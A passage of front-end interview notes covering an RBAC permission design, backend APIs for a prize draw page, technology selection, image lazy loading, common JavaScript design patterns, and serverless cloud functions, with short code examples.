        <ProjectContext.Provider value={{ project, setProject, handleComponentSelect }}>
            {children}
        </ProjectContext.Provider>
    );
};

const App = () => {
    const { project, handleComponentSelect } = useContext(ProjectContext);

    const renderComponent = (component) => (
        <div style={component.style} onClick={() => handleComponentSelect(component.id)}>
            {component.type === 'text' ? component.attributes.content : (
                <img src={component.attributes.src} alt={component.attributes.alt} style={{ width: '100%', height: 'auto' }} />
            )}
        </div>
    );

    return (
        <div style={{ backgroundColor: project.layout.backgroundColor }}>
            <h1 style={{ fontSize: project.layout.fontSize }}>{project.title}</h1>
            {project.components.map(renderComponent)}
        </div>
    );
};
```

## Design a "User - Role - Permission" System

Implementing a User - Role - Permission system effectively manages access within software, such as a blog management system. This is typically structured using the Role-Based Access Control (RBAC) model, a proven approach for handling large-scale permission management due to its scalability and maintainability.

RBAC helps simplify the assignment and management of access rights within a system by linking permissions to roles, and roles to users. This model is adaptable, making it easier to implement changes to access policies and manage user permissions with minimal disruption.

### User Types and Permissions

A blog management system may feature several types of users, each with unique permissions:

- **Normal User**: Capable of reading, auditing, and hiding blog posts.
- **Admin User**: Inherits all permissions of a normal user, and can additionally update and delete blog posts.
- **Super Admin**: Inherits all permissions of an admin user, with further capabilities to manage user accounts, assign roles, and modify user roles and permissions.

### Data Models

Key entities in the RBAC system include:

#### User
- `id`: A unique identifier for each user.
- `user_name`: A username for logging in.
- `hashed_password`: A securely encrypted password.
- `comment`: An optional field for notes or additional information about the user.

#### Role
- `id`: A unique identifier for each role.
- `role_name`: The name of the role, indicative of its associated permissions.

#### Permission
- `permission_id`: A unique identifier for each permission.
- `permission_name`: A description of the action that the permission allows.

### Relationships

Effective management of relationships is crucial in an RBAC system to maintain data integrity and system security.

#### User_Role
- `user_id`: Connects to a specific user.
- `role_id[]`: An array of role identifiers, enabling a many-to-many relationship between users and roles.

#### Role_Permission
- `role_id`: Connects to a specific role.
- `permission_id[]`: An array of permission identifiers, allowing a role to be associated with multiple permissions.

### Functional Modules

The system should be divided into manageable modules to enhance maintainability and scalability:

- **User Management**: Handles creating, deleting, modifying users, and assigning roles.
- **Role Management**: Manages creating, deleting, and modifying roles, as well as assigning permissions.
- **Permission Management**: Responsible for creating, deleting, and modifying permissions.

### Design Principles

- **Clarity**: Components should be distinct and understandable to both developers and end-users.
- **Maintainability**: The system should be easy to modify and update.
- **Scalability**: Designed to accommodate growth in users, roles, and permissions without degradation in performance.
- **Standards Adherence**: Follow established best practices and standards, utilizing existing solutions before developing new methodologies.

## Design a HTML5 prize draw page, what are the backend api you need to implement?
Thinking process:  
1. think about the user flow, business logic process, different stages of the process
2. think about the api you need to implement in each step

### User Flow and Business Logic

1. **User Registration and Authentication**: This is the starting point for user interaction on the prize draw page. Users need to log in or register to participate.
2. **Prize Draw Participation**: The system checks if the user has already participated in the draw. If not, the user can proceed to draw a prize.
3. **Result Handling and Information Submission**: After drawing, the user can see the results and must submit additional information (e.g., shipping address) if they win.
4. **Post-Draw Interactions**: Users can check the status of their prize, view previous draws, and get details about the prizes they've won.

### Backend API Requirements

To support the user flow and business logic detailed above, a robust set of backend APIs will need to be developed:

1. **User API**: Register a new user. Authenticate a user. Retrieve user profile information. Update user profile information.

2. **Draw Prize API**: Perform a prize draw. Retrieve the current status of a draw. Fetch the result of the last prize draw.

3. **Prize API**: List all available prizes. Get details about a specific prize. Retrieve the user's prize draw history. Update information about a prize (admin restricted).

4. **Statistics API**: Obtain general statistics about page visits, user participation in draws, and shares.

5. **Share API**: Log a user's action of sharing the page to social media.

## How would you approach technology selection as the front-end lead on a project?

Choosing the right technology stack is essential for the success of a project. This decision should be guided by several factors, which include but are not limited to the project requirements, the team's expertise, and the long-term maintenance of the project.

1. Choosing a Front-End Framework

    Frameworks like Vue, React, Nuxt.js, and Next.js each have their strengths and are suitable for different kinds of projects:

    - **Vue and Nuxt.js**: Best for progressive web applications and when you need a quick development environment setup. Vue's ecosystem is friendly and incrementally adoptable.
    - **React and Next.js**: Ideal for large-scale applications with complex states and dynamic content. React's component-based architecture facilitates reusable UI components.
2. Selecting the Programming Language
   - **JavaScript**: The standard language of the web; vast ecosystem, high flexibility.
   - **TypeScript**: Offers type safety and is preferable in large projects to reduce bugs and enhance code quality.
3. DevOps, CI/CD, and Build Tools
   - Incorporating DevOps practices and continuous integration/continuous delivery (CI/CD) pipelines ensures that your development process is efficient and that deployments are smooth.
   - Common build tools like Webpack and Babel are essential for bundling JavaScript applications and managing assets.

### Decision Factors
- Is the community mature?  
    A mature community means better support, more libraries, and a greater likelihood of finding solutions to problems that arise.
- Does our company have experience with the technology?
    Leveraging existing knowledge can reduce training time and lead to faster development cycles.
-Cost of learning for the team
    Consider how easy it is for your team to learn the technology. Avoid high learning curves if speed is a priority.

### Cost Considerations
-Learning Curve
    Technologies that are complex to understand or that have poor documentation can slow down development.
- Maintenance
    For instance, excessive use of `any` in TypeScript can defeat the purpose of using TypeScript in the first place due to the lack of type safety.
- DevOps Costs
    The integration of continuous integration and continuous delivery systems can vary in complexity and cost depending on the chosen technologies.

**Final Note**: While there's no inherently "good" or "bad" technology, the best choice always depends on the specific context of the project and the composition of the team. It's important not to follow trends blindly but to choose technologies that offer the best balance of benefits to challenges in your specific situation. Always be balanced and analytical in your approach to technology selection.

## Implement HTML5 Image Lazy Loading

1. **HTML Markup Setup**: Implement the `loading` attribute in the `<img>` tag to utilize browser-native lazy loading. For older browser compatibility, use `data-src` for the image URL and `src` for a placeholder.

    ```html
    <img src="placeholder.png" data-src="actual_image.png" alt="Descriptive Text" loading="lazy">
    ```

2. **Scroll Event Handling**: Monitor the scroll event to load images as they come into view. Throttle the event to enhance performance by reducing the frequency of execution.

    ```javascript
    window.addEventListener('scroll', _.throttle(() => {
        document.querySelectorAll('img[data-src]').forEach(img => {
            if (img.getBoundingClientRect().top < window.innerHeight) {
                img.src = img.dataset.src;
                img.removeAttribute('data-src'); // Prevent reprocessing
            }
        });
    }, 100));
    ```

3. **Initial Image Processing**: On page load, assess and load visible images immediately, catering for content initially within the viewport.

    ```javascript
    document.addEventListener('DOMContentLoaded', () => {
        mapImagesAndTryLoad(); // Load visible images at start
    });
    ```

**Optimization Tips**

- **Intersection Observer API**: Use this modern API for a more efficient detection of visible elements, which avoids the overhead of repeated event handling.
- **Throttle vs. Debounce**: Choose between these techniques based on event characteristics and desired responsiveness. Throttling ensures regular execution at fixed intervals, suitable for scroll events, while debouncing delays execution until event activity stops, ideal for resize events.

1. Get Image Position and Window Height
    - Understanding an element's position and the viewport size is essential for tasks like animations, dynamic content loading, and responsive design.
2. Retrieve Element Position
   - **Using `getBoundingClientRect()`**: This method returns an object detailing an element's size and its position relative to the viewport.
       ```javascript
       const elementPosition = document.getElementById('example').getBoundingClientRect();
       ```
3. Determine Viewport Size
   - **Using `window.innerHeight`**: This property gives the height of the layout viewport, useful for sizing and layout adjustments.
       ```javascript
       const viewportHeight = window.innerHeight;
       ```

### Practical Example
```html
<body>
    <!-- Images tagged for lazy loading -->
    <img src="placeholder.png" data-src="actual_image.png" alt="Image Description" loading="lazy">
    <img src="placeholder.png" data-src="actual_image.png" alt="Image Description" loading="lazy">
</body>

<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.11/lodash.min.js"></script>
<script>
    // Throttled scroll event for lazy loading
    window.addEventListener('scroll', _.throttle(() => {
        mapImagesAndTryLoad();
    }, 100));

    document.addEventListener('DOMContentLoaded', () => {
        mapImagesAndTryLoad(); // Immediately load visible images
    });
</script>
```

# 9. Design Patterns.md

## Common Design Patterns in Front-End Development and Their Usage Scenarios

### Design Principles
The most important principle in design patterns is the **Open/Closed Principle**, which states that a system should be open for extension but closed for modification. This means you should be able to add new functionality without changing the existing code.

### Factory Pattern
The Factory pattern involves using a factory function to create instances, effectively hiding the `new` keyword to encapsulate the creation process. This pattern is useful for scenarios where the creation process is complex or when there needs to be some control over how instances are created. Examples include the jQuery `$` function and React's `createElement` function.

**Example**:
```typescript
class Foo {}

function factory() {
    return new Foo();
}

const f = factory();
```

### Singleton Pattern
The Singleton pattern ensures that a class has only one instance and provides a global point of access to it. This is particularly useful for cases where a single instance of a class should be used across the system, such as the store in Vuex and Redux or a globally unique dialog/modal. JavaScript makes implementing singletons straightforward because there's no need to worry about multithreading issues that might arise in languages like Java, where thread locking mechanisms might be necessary to prevent multiple instances from being created.

**Example**:
```typescript
class Singleton {
    private static instance: Singleton;
    private constructor() {}
    static getInstance() {
        if (!Singleton.instance) {
            Singleton.instance = new Singleton();
        }
        return Singleton.instance;
    }
    fn1() {}
    fn2() {}
}

const s = Singleton.getInstance();
s.fn1();
```

### Proxy Pattern
The Proxy pattern involves using a proxy layer that clients interact with instead of accessing the object directly. This allows for various operations, like monitoring or intercepting get and set operations, to be performed transparently. A practical example of this pattern is the implementation of Vue3's reactivity system using ES6's `Proxy`.

**Example**:
```typescript
const obj = new Proxy({}, {
    get(target, key) {
        console.log('get', key);
        return target[key];
    },
    set(target, key, value) {
        console.log('set', key, value);
        target[key] = value;
    }
});
obj.name = 'jack';
console.log(obj.name);
```

### Observer Pattern
The Observer pattern is widely used in front-end development. It involves a subject and observers, where the observers are notified and updated whenever the subject undergoes a change. A common example is attaching click event listeners to a button, where each listener acts as an observer to the button's click event.

**Example**:
```typescript
btn.addEventListener('click', () => {
    console.log('click');
});
```

### Publish-Subscribe Pattern
Similar to the Observer pattern, the Publish-Subscribe pattern provides a more decoupled way for components to communicate. Components can publish events to a specific event channel and subscribe to this channel to receive notifications. It's important to unsubscribe from events, especially in component lifecycle hooks, to prevent memory leaks.

**Example**:
```typescript
event.on('event-key', () => {
    console.log('event 1');
});
event.on('event-key', () => {
    console.log('event 2');
});
event.emit('event-key');

// Remember to unsubscribe
function fn1() {}
event.on('event-key', fn1);
event.off('event-key', fn1);
```

### Decorator Pattern
The Decorator pattern allows for behavior to be added to individual objects, either statically or dynamically, without affecting the behavior of other objects from the same class. This pattern is similar to Aspect-Oriented Programming (AOP) and is supported in ES and TypeScript through decorator syntax. It's particularly useful for adding features or functionalities to existing classes without modifying them.

**Example**:
```typescript
@testable
class MyTestableClass {
    // ...
}

function testable(target) {
    target.isTestable = true;
}

console.log(MyTestableClass.isTestable);
```
In the example above, `@testable` is a decorator that adds new functionality to `MyTestableClass`.

### What's the distinction between the Observer pattern and the Publish-Subscribe pattern?

### Observer Pattern
In the Observer pattern, the subject (the object being observed) and the observers (the objects that want to be notified of changes in the subject) have direct knowledge of each other. This means there is a direct relationship where the subject holds references to the observers and directly notifies them of any changes. This pattern allows for a straightforward and direct communication line but can lead to higher coupling between the subject and its observers.

#### Characteristics:
- **Direct Communication**: Observers are directly registered with the subject.
- **Coupling**: There is a higher degree of coupling, as the subject and observers are directly aware of each other.
- **Use Case**: Suitable for simpler scenarios where the subject's state change is of interest to specific observers directly related to the subject.

### Publish-Subscribe Pattern
The Publish-Subscribe pattern, on the other hand, introduces a middle layer known as the "event channel" or "message broker," which decouples the publishers (the sources of events) from the subscribers (the receivers of events). Publishers publish events to the event channel without knowing who the subscribers will be. Similarly, subscribers listen for events through the event channel without knowing who the publishers are. This level of indirection adds flexibility and reduces coupling between components, making the system more scalable and easier to extend.

#### Characteristics:
- **Indirect Communication**: The communication between publishers and subscribers is mediated by an event channel, without direct knowledge of each other.
- **Coupling**: There is lower coupling due to the presence of the event channel as an intermediary.
- **Use Case**: Ideal for more complex scenarios where the event source and event consumers need to remain decoupled for scalability and maintainability reasons.

In summary, the key difference lies in the relationship and communication method between the parties involved: the Observer pattern facilitates direct communication between the subject and its observers, resulting in tighter coupling, whereas the Publish-Subscribe pattern uses an event channel to mediate communication, leading to looser coupling and greater flexibility.

## Benefits of Using Cloud Functions like Google Cloud Compared to Traditional Front-end/Back-end Separation

Cloud functions, such as those provided by Google Cloud, offer several advantages over the traditional front-end/back-end separation architecture. These benefits stem from cloud functions' ability to operate in a serverless environment, which changes how applications are built, deployed, and scaled. Below, we detail these benefits:

### Cost Efficiency
- **Google Cloud Functions** operate on a pay-as-you-go model, where charges are incurred only when the code is executed. This is particularly beneficial for applications with fluctuating traffic, as it aligns operational costs directly with actual usage, avoiding the need to pay for idle resources.

### Simplified Management
- **Serverless Architecture**: With Google Cloud Functions, there's no need to manage servers. Google handles all the infrastructure management tasks, including maintenance, patching, and security. In contrast, traditional architectures, even when utilizing virtual or cloud servers, require developers or operations teams to manage server configuration and upkeep.

### Automatic Scaling
- **Adaptability to Traffic**: Google Cloud Functions automatically scale based on the number of requests. This ensures that during peak traffic periods, more resources are allocated to handle increased concurrent requests, and during low traffic times, resources are reduced to save costs. Traditional models often require manual intervention or additional automation tools for scaling.

### Rapid Iteration
- **Development Agility**: The serverless model enables developers to quickly create and deploy code without worrying about underlying infrastructure. This supports faster development cycles and rapid iteration, whereas traditional deployment models might involve complex configuration and deployment processes.

### Integration and Automation
- **Seamless Ecosystem Connectivity**: Google Cloud Functions can be easily integrated with other services and tools within the Google Cloud Platform (GCP), such as Google Cloud Pub/Sub and Google Cloud Storage. This facilitates the creation of end-to-end automated solutions, streamlining the development process and enhancing functionality.

### Event-Driven Architecture
- **Responsive Microservices**: Google Cloud Functions inherently support an event-driven architecture, directly responding to events from Google Cloud services, like file uploads to Google Cloud Storage or messages published to Google Cloud Pub/Sub. This model is ideal for building highly decoupled and responsive microservices, as it allows services to react immediately to changes and triggers within the ecosystem.